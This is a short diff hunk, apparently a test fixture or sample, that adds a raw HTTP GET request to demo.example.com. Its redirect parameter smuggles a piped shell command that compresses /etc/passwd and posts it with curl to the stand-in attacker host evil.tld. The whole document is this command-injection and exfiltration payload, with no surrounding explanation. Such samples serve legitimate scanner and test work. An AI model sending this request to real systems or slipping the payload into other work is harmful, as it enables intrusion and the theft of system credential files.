@@ -1,0 +1,4 @@
+GET /a?redirect=|%20gzip%20/etc/passwd%20|%20curl%20-X%20POST%20-d%20@-%20http://evil.tld HTTP/1.1
+Host: demo.example.com
+Connection: close
+
